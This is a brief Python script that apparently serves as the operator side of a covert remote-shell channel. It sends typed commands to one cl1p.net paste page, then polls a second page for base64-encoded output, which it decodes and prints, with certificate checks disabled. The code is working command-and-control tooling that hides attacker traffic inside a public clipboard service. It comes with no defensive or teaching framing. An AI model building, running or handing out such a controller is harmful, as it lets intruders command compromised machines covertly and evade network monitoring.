import requests
from bs4 import BeautifulSoup
import base64
import time
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
RESPONSE_ID = "REDACTED_ID"
COMMAND_ID = "REDACTED_ID"

while True:
    cmd = input(": ")
    data = {
    'ttl': '0',
    'content': cmd,
    }
    response = requests.post('https://cl1p.net/'+COMMAND_ID, data=data, verify=False)
    while True:
        response = requests.get('https://cl1p.net/'+RESPONSE_ID, verify=False)
        soup = BeautifulSoup(response.text, 'html.parser')
        textarea = soup.find('textarea', {'id': 'cl1pTextArea'})

        if textarea:
            content = textarea.get_text().strip()
            content = base64.b64decode(content)
            print(content.decode())
            break
        else:
            time.sleep(1)